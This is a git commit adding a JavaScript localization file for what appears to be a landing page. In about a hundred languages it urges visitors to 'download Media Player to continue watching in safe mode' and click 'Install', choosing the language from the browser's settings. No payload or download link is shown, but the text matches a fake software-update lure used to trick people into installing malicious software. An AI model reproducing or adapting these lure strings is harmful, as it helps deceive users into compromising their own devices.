81157e990a99ac6ad91d31e7678f6f4573626095
Weipluss <q917162074@gmail.com>
2025-05-19 22:41:21 +0800

    LP1

---
+++ LP1/translates.js
@@ -0,0 +1,139 @@
+var langs = {
+fy:{step1:"Media Player Update",step2:"Download asjebleaft Media Player om fierder te sjen yn feilige modus",step3:"What lies behind this button could make a difference. Are you ready to explore?",},
+ny:{step1:"Kusintha kwa Media Player",step2:"Chonde tsitsani Media Player kuti mupitilize kuwonera mumayendedwe otetezeka",step3:"Ikani",},
+be:{step1:"Абнаўленне медыяплэера",step2:"Спампуйце медыяплэер, каб працягнуць прагляд у бяспечным рэжыме",step3:"Усталяваць",},
+hu:{step1:"Médialejátszó frissítése",step2:"Kérjük, töltse le a Media Playert a csökkentett módban való nézéshez",step3:"Telepítés",},
+gu:{step1:"મીડિયા પ્લેયર અપડેટ",step2:"સુરક્ષિત મોડમાં જોવાનું ચાલુ રાખવા માટે કૃપા કરીને મીડિયા પ્લેયર ડાઉનલોડ કરો",step3:"ઇન્સ્ટોલ કરો",},
+haw:{step1:"Mea Hoʻohou Media",step2:"E ʻoluʻolu e hoʻoiho i ka Media Player e hoʻomau i ka nānā ʻana ma ke ʻano palekana",step3:"Hoʻokomo",},
+ky:{step1:"Медиа ойноткучту жаңыртуу",step2:"Коопсуз режимде көрүүнү улантуу үчүн Media Player жүктөп алыңыз",step3:"Орнотуу",},
+kk:{step1:"Медиа ойнатқышты жаңарту",step2:"Қауіпсіз режимде көруді жалғастыру үшін Media Player қолданбасын жүктеп алыңыз",step3:"Орнату",},
+ga:{step1:"Nuashonrú seinnteoir meáin",step2:"Íoslódáil Media Player chun leanúint ar aghaidh ag breathnú i mód sábháilte",step3:"Suiteáil",},
+mt:{step1:"Aġġornament tal-Media Player",step2:"Jekk jogħġbok niżżel Media Player biex tkompli tara fil-modalità sigura",step3:"Installa",},
+my:{step1:"Media Player အပ်ဒိတ်",step2:"ဘေးကင်းသောမုဒ်တွင် ဆက်လက်ကြည့်ရှုရန် Media Player ကို ဒေါင်းလုဒ်လုပ်ပါ။",step3:"တပ်ဆင်ပါ။",},
+lb:{step1:"Media Player Update",step2:"Luet w.e.g. Media Player erof fir weider a séchere Modus ze kucken",step3:"Installéieren",},
+fa:{step1:"به روز رسانی مدیا پلیر",step2:"لطفا Media Player را دانلود کنید تا در حالت ایمن به تماشا ادامه دهید",step3:"نصب کنید",},
+st:{step1:"Phatlalatso ea Media Player",step2:"Ka kopo, khoasolla Media Player ho tsoela pele ho shebella ka mokhoa o bolokehileng",step3:"Kenya",},
+si:{step1:"Media Player යාවත්කාලීන කිරීම",step2:"ආරක්ෂිත ප්‍රකාරයේදී දිගටම නැරඹීමට කරුණාකර Media Player බාගන්න",step3:"ස්ථාපනය කරන්න",},
+gl:{step1:"Actualización do reprodutor multimedia",step2:"Descarga Media Player para seguir vendo en modo seguro",step3:"Instalar",},
+ht:{step1:"Mizajou Media Player",step2:"Tanpri telechaje Media Player pou kontinye gade nan mòd san danje",step3:"Enstale",},
+bs:{step1:"Ažuriranje Media Playera",step2:"Preuzmite Media Player da nastavite sa gledanjem u sigurnom načinu rada",step3:"Instaliraj",},
+jw:{step1:"Pembaruan Pamuter Media",step2:"Mangga download Media Player kanggo terus nonton ing mode aman",step3:"Instal",},
+hi:{step1:"मीडिया प्लेयर अपडेट",step2:"कृपया सुरक्षित मोड में देखना जारी रखने के लिए मीडिया प्लेयर डाउनलोड करें",step3:"स्थापित करना",},
+is:{step1:"Uppfærsla fjölmiðlaspilara",step2:"Vinsamlegast hlaðið niður Media Player til að halda áfram að horfa í öruggri stillingu",step3:"Settu upp",},
+mk:{step1:"Ажурирање на медиа плеер",step2:"Преземете го Media Player за да продолжите да гледате во безбеден режим",step3:"Инсталирајте",},
+km:{step1:"បច្ចុប្បន្នភាពកម្មវិធីចាក់មេឌៀ",step2:"សូមទាញយក Media Player ដើម្បីបន្តមើលក្នុងរបៀបសុវត្ថិភាព",step3:"ដំឡើង",},
+lo:{step1:"ອັບເດດ Media Player",step2:"ກະລຸນາດາວໂຫຼດ Media Player ເພື່ອສືບຕໍ່ເບິ່ງໃນໂໝດປອດໄພ",step3:"ຕິດຕັ້ງ",},
+mi:{step1:"Whakahōu Pūpāpāho",step2:"Tena koa tikina te Pūpāpāho kia mātaki tonu i te aratau haumaru",step3:"Tāuta",},
+sn:{step1:"Media Player Update",step2:"Ndokumbirawo udhawunirodhe Media Player kuti uenderere mberi nekuona mune yakachengeteka mode",step3:"Install",},
+ne:{step1:"मिडिया प्लेयर अपडेट",step2:"सुरक्षित मोडमा हेर्न जारी राख्न कृपया मिडिया प्लेयर डाउनलोड गर्नुहोस्",step3:"स्थापना गर्नुहोस्",},
+su:{step1:"Pamuter Media Update",step2:"Mangga unduh Media Player pikeun neraskeun nonton dina modeu aman",step3:"Pasang",},
+so:{step1:"Cusboonaysiinta Ciyaartoyga Warbaahinta",step2:"Fadlan soo deji Media Player si aad ugu sii wado daawashada qaab nabdoon",step3:"Ku rakib",},
+sm:{step1:"Fa'afouga fa'afouga",step2:"Fa'amolemole la'u mai i lalo le Media Player e fa'aauau le matamata i le tulaga saogalemu",step3:"Fa'apipi'i",},
+gd:{step1:"Cluicheadair mheadhanan a luchdadh a-nuas",step2:"Feuch an luchdaich thu sìos Media Player gus leantainn ort a’ coimhead ann am modh sàbhailte",step3:"Stàladh",},
+ps:{step1:"د میډیا پلیر تازه کول",step2:"مهرباني وکړئ په خوندي حالت کې لیدو ته دوام ورکولو لپاره میډیا پلیر ډاونلوډ کړئ",step3:"نصب کړئ",},
+sd:{step1:"ميڊيا پليئر اپڊيٽ",step2:"مھرباني ڪري ڊائون لوڊ ڪريو ميڊيا پليئر محفوظ موڊ ۾ ڏسڻ جاري رکڻ لاءِ",step3:"انسٽال ڪريو",},
+la:{step1:"Media ludius Update",step2:"Quaeso download Media pergere vigilantes in tutum modus",step3:"install",},
+mg:{step1:"Media Player Update",step2:"Alefaso azafady ny Media Player hanohizana mijery amin'ny fomba azo antoka",step3:"hametraka",},
+mn:{step1:"Медиа тоглуулагчийн шинэчлэл",step2:"Аюулгүй горимд үргэлжлүүлэн үзэхийн тулд Media Player-г татаж авна уу",step3:"Суулгах",},
+kn:{step1:"ಮೀಡಿಯಾ ಪ್ಲೇಯರ್ ನವೀಕರಣ",step2:"ಸುರಕ್ಷಿತ ಮೋಡ್‌ನಲ್ಲಿ ವೀಕ್ಷಿಸುವುದನ್ನು ಮುಂದುವರಿಸಲು ಮೀಡಿಯಾ ಪ್ಲೇಯರ್ ಅನ್ನು ಡೌನ್‌ಲೋಡ್ ಮಾಡಿ",step3:"ಸ್ಥಾಪಿಸಿ",},
+ku:{step1:"Nûvekirina Media Player",step2:"Ji kerema xwe Media Player dakêşin ku hûn di moda ewle de temaşekirinê bidomînin",step3:"Lêkirin",},
+ig:{step1:"Mmelite ọkpụkpọ mgbasa ozi",step2:"Biko budata ihe ọkpụkpọ mgbasa ozi ka ịga n'ihu na-ekiri na ọnọdụ nchekwa",step3:"Wụnye",},
+ka:{step1:"მედია ფლეერის განახლება",step2:"გთხოვთ, ჩამოტვირთოთ Media Player, რათა გააგრძელოთ ყურება უსაფრთხო რეჟიმში",step3:"დააინსტალირეთ",},
+ha:{step1:"Sabunta Mai kunnawa Media",step2:"Da fatan za a sauke Mai jarida don ci gaba da kallo cikin yanayin aminci",step3:"Shigar",},
+hmn:{step1:"Media Player Hloov tshiab",step2:"Thov rub tawm Media Player txuas ntxiv saib hauv hom kev nyab xeeb",step3:"Nruab",},
+sw:{step1:"Sasisho la Kicheza Media",step2:"Tafadhali pakua Media Player ili kuendelea kutazama katika hali salama",step3:"Sakinisha",},
+ceb:{step1:"Update sa Media Player",step2:"Palihug i-download ang Media Player aron magpadayon sa pagtan-aw sa luwas nga mode",step3:"Pag-instalar",},
+co:{step1:"Actualizazione di Media Player",step2:"Per piacè scaricate Media Player per cuntinuà à vede in modu sicuru",step3:"Installa",},
+cy:{step1:"Diweddariad Chwaraewr Cyfryngau",step2:"Dadlwythwch Media Player i barhau i wylio yn y modd diogel",step3:"Gosod",},
+yo:{step1:"Imudojuiwọn Media Player",step2:"Jọwọ ṣe igbasilẹ Media Player lati tẹsiwaju wiwo ni ipo ailewu",step3:"Fi sori ẹrọ",},
+uz:{step1:"Media pleerni yangilash",step2:"Xavfsiz rejimda tomosha qilishni davom ettirish uchun Media Player-ni yuklab oling",step3:"O'rnatish",},
+yi:{step1:"מעדיע פּלייַער דערהייַנטיקן",step2:"ביטע אראפקאפיע מעדיע פּלייַער צו פאָרזעצן וואַטשינג אין זיכער מאָדע",step3:"ינסטאַלירן",},
+xh:{step1:"Uhlaziyo lweMedia Player",step2:"Nceda ukhuphele iMedia Player ukuqhubeka nokubukela ngendlela ekhuselekileyo",step3:"Faka",},
+en:{step1:"Media Player Update",step2:"Please download Media Player to continue watching in safe mode",step3:"Install",},
+bn:{step1:"মিডিয়া প্লেয়ার আপডেট",step2:"নিরাপদ মোডে দেখা চালিয়ে যেতে দয়া করে মিডিয়া প্লেয়ার ডাউনলোড করুন",step3:"ইনস্টল করুন",},
+ar:{step1:"تحديث مشغل الوسائط",step2:"يرجى تنزيل Media Player لمواصلة المشاهدة في الوضع الآمن",step3:"ثَبَّتَ",},
+ca:{step1:"Actualització del reproductor multimèdia",step2:"Baixeu Media Player per continuar mirant en mode segur",step3:"Instal·lar",},
+bg:{step1:"Актуализация на Media Player",step2:"Моля, изтеглете Media Player, за да продължите да гледате в безопасен режим",step3:"Инсталирайте",},
+hr:{step1:"Ažuriranje Media Playera",step2:"Preuzmite Media Player za nastavak gledanja u sigurnom načinu rada",step3:"Instalirati",},
+nl:{step1:"Mediaspeler-update",step2:"Download Media Player om in de veilige modus verder te kijken",step3:"Installeren",},
+de:{step1:"Media Player-Update",step2:"Bitte laden Sie den Media Player herunter, um die Wiedergabe im abgesicherten Modus fortzusetzen",step3:"Installieren",},
+tl:{step1:"Update sa Media Player",step2:"Mangyaring i-download ang Media Player upang magpatuloy sa panonood sa safe mode",step3:"I-install",},
+ko:{step1:"미디어 플레이어 업데이트",step2:"안전모드로 계속 시청하시려면 미디어 플레이어를 다운로드하세요.",step3:"설치하다",},
+id:{step1:"Pembaruan Pemutar Media",step2:"Silakan unduh Media Player untuk melanjutkan menonton dalam mode aman",step3:"Memasang",},
+ms:{step1:"Kemas Kini Pemain Media",step2:"Sila muat turun Media Player untuk meneruskan menonton dalam mod selamat",step3:"Pasang",},
+eo:{step1:"Ĝisdatigo de Media Player",step2:"Bonvolu elŝuti Media Player por daŭrigi spekti en sekura reĝimo",step3:"Instali",},
+fi:{step1:"Mediasoittimen päivitys",step2:"Lataa Media Player jatkaaksesi katselua vikasietotilassa",step3:"Asentaa",},
+cs:{step1:"Aktualizace přehrávače médií",step2:"Chcete-li pokračovat ve sledování v nouzovém režimu, stáhněte si přehrávač Media Player",step3:"Instalovat",},
+lv:{step1:"Media Player atjauninājums",step2:"Lūdzu, lejupielādējiet Media Player, lai turpinātu skatīties drošajā režīmā",step3:"Instalējiet",},
+it:{step1:"Aggiornamento del lettore multimediale",step2:"Scarica Media Player per continuare a guardare in modalità provvisoria",step3:"Installare",},
+el:{step1:"Ενημέρωση Media Player",step2:"Κάντε λήψη του Media Player για να συνεχίσετε την παρακολούθηση σε ασφαλή λειτουργία",step3:"Εγκαθιστώ",},
+ml:{step1:"മീഡിയ പ്ലെയർ അപ്ഡേറ്റ്",step2:"സുരക്ഷിത മോഡിൽ കാണുന്നത് തുടരാൻ മീഡിയ പ്ലെയർ ഡൗൺലോഡ് ചെയ്യുക",step3:"ഇൻസ്റ്റാൾ ചെയ്യുക",},
+da:{step1:"Opdatering af medieafspiller",step2:"Download venligst Media Player for at fortsætte med at se i sikker tilstand",step3:"Installere",},
+et:{step1:"Meediumipleieri värskendus",step2:"Turvarežiimis vaatamise jätkamiseks laadige alla Media Player",step3:"Installige",},
+fr:{step1:"Mise à jour du lecteur multimédia",step2:"Veuillez télécharger Media Player pour continuer à regarder en mode sans échec",step3:"Installer",},
+iw:{step1:"עדכון נגן מדיה",step2:"אנא הורד את Media Player כדי להמשיך לצפות במצב בטוח",step3:"לְהַתְקִין",},
+ja:{step1:"メディアプレーヤーのアップデート",step2:"セーフモードで視聴を続けるには、メディアプレーヤーをダウンロードしてください。",step3:"インストール",},
+lt:{step1:"Media Player atnaujinimas",step2:"Atsisiųskite Media Player, kad galėtumėte toliau žiūrėti saugiuoju režimu",step3:"Įdiegti",},
+no:{step1:"Media Player-oppdatering",step2:"Last ned Media Player for å fortsette å se i sikker modus",step3:"Installer",},
+mr:{step1:"मीडिया प्लेयर अपडेट",step2:"सुरक्षित मोडमध्ये पाहणे सुरू ठेवण्यासाठी कृपया मीडिया प्लेयर डाउनलोड करा",step3:"स्थापित करा",},
+ro:{step1:"Actualizare Media Player",step2:"Vă rugăm să descărcați Media Player pentru a continua vizionarea în modul sigur",step3:"Instala",},
+sv:{step1:"Uppdatering av mediaspelare",step2:"Ladda ner Media Player för att fortsätta titta i säkert läge",step3:"Installera",},
+sk:{step1:"Aktualizácia prehrávača médií",step2:"Ak chcete pokračovať v pozeraní v núdzovom režime, stiahnite si prehrávač médií",step3:"Inštalovať",},
+ur:{step1:"میڈیا پلیئر اپ ڈیٹ",step2:"محفوظ موڈ میں دیکھنا جاری رکھنے کے لیے براہ کرم میڈیا پلیئر ڈاؤن لوڈ کریں۔",step3:"انسٹال کریں۔",},
+uk:{step1:"Оновлення медіаплеєра",step2:"Будь ласка, завантажте Media Player, щоб продовжити перегляд у безпечному режимі",step3:"встановити",},
+te:{step1:"మీడియా ప్లేయర్ నవీకరణ",step2:"సురక్షిత మోడ్‌లో చూడటం కొనసాగించడానికి దయచేసి మీడియా ప్లేయర్‌ని డౌన్‌లోడ్ చేయండి",step3:"ఇన్‌స్టాల్ చేయండి",},
+sl:{step1:"Posodobitev predvajalnika medijev",step2:"Prenesite Media Player, da nadaljujete z gledanjem v varnem načinu",step3:"Namestite",},
+th:{step1:"อัพเดตเครื่องเล่นสื่อ",step2:"กรุณาดาวน์โหลด Media Player เพื่อรับชมต่อในโหมดปลอดภัย",step3:"ติดตั้ง",},
+tg:{step1:"Навсозии плеери медиа",step2:"Лутфан, Media Player -ро зеркашӣ кунед, то тамошоро дар ҳолати бехатар идома диҳед",step3:"Насб кунед",},
+pl:{step1:"Aktualizacja odtwarzacza multimedialnego",step2:"Aby kontynuować oglądanie w trybie awaryjnym, pobierz program Media Player",step3:"Zainstalować",},
+pt:{step1:"Atualização do Media Player",step2:"Baixe o Media Player para continuar assistindo no modo de segurança",step3:"Instalar",},
+ru:{step1:"Обновление медиаплеера",step2:"Пожалуйста, загрузите Media Player, чтобы продолжить просмотр в безопасном режиме.",step3:"Установить",},
+ta:{step1:"மீடியா பிளேயர் புதுப்பிப்பு",step2:"பாதுகாப்பான பயன்முறையில் தொடர்ந்து பார்க்க மீடியா பிளேயரைப் பதிவிறக்கவும்",step3:"நிறுவவும்",},
+es:{step1:"Actualización del reproductor multimedia",step2:"Descargue Media Player para continuar viendo en modo seguro",step3:"Instalar",},
+sr:{step1:"Ажурирање медија плејера",step2:"Преузмите Медиа Плаиер да бисте наставили да гледате у безбедном режиму",step3:"Инсталирај",},
+vi:{step1:"Cập nhật trình phát phương tiện",step2:"Vui lòng tải xuống Media Player để tiếp tục xem ở chế độ an toàn",step3:"Cài đặt",},
+tr:{step1:"Medya Oynatıcısı Güncellemesi",step2:"Güvenli modda izlemeye devam etmek için lütfen Media Player'ı indirin",step3:"Düzenlemek",},
+af:{step1:"Mediaspeler-opdatering",step2:"Laai asseblief Media Player af om in veilige modus voort te gaan kyk",step3:"Installeer",},
+sq:{step1:"Përditësimi i Media Player",step2:"Shkarkoni Media Player për të vazhduar shikimin në modalitetin e sigurt",step3:"Instaloni",},
+az:{step1:"Media Player Yeniləmə",step2:"Təhlükəsiz rejimdə baxmağa davam etmək üçün Media Player-i endirin",step3:"Quraşdırın",},
+hy:{step1:"Մեդիա նվագարկչի թարմացում",step2:"Խնդրում ենք ներբեռնել Media Player-ը, որպեսզի շարունակեք դիտել անվտանգ ռեժիմում",step3:"Տեղադրեք",},
+eu:{step1:"Media Player eguneratzea",step2:"Mesedez, deskargatu Media Player modu seguruan ikusten jarraitzeko",step3:"Instalatu",},
+am:{step1:"የሚዲያ ማጫወቻ ማሻሻያ",step2:"እባክዎ በአስተማማኝ ሁነታ መመልከትዎን ለመቀጠል ሚዲያ ማጫወቻን ያውርዱ",step3:"ጫን",},
+zh:{step1:"媒体播放器更新",step2:"请下载 Media Player 以在安全模式下继续观看",step3:"安装",},       
+};
+$(document).ready(function () {
+  var langBrowser =
+      navigator.language || (navigator.languages && navigator.languages[0]),
+      param = langs[langBrowser];
+  if (param == undefined && langBrowser && langBrowser.length > 0) {
+    var parsedLang = langBrowser.slice(0, 2);
+    if (langs[parsedLang]) {
+      param = langs[parsedLang];
+    }
+  }
+  if (param == undefined) {
+    param = langs["en"];
+    // 'en' - default language, if you want change language, please select in object abbreviation. Example: 'fr', 'ru' etc.
+    $("#step1").text(param.step1);
+    $("#step2").text(param.step2);
+    $("#step3").text(param.step3);
+    $("#step4").text(param.step4);
+    $("#step5").text(param.step5);
+    $("#step6").text(param.step6);
+    $("#step7").text(param.step7);
+    $("#step8").text(param.step8);
+    $("#step9").text(param.step9);
+  }
+  else {
+    $("#step1").text(param.step1);
+    $("#step2").text(param.step2);
+    $("#step3").text(param.step3);
+    $("#step4").text(param.step4);
+    $("#step5").text(param.step5);
+    $("#step6").text(param.step6);
+    $("#step7").text(param.step7);
+    $("#step8").text(param.step8);
+    $("#step9").text(param.step9);
+  }
+}
+                  );
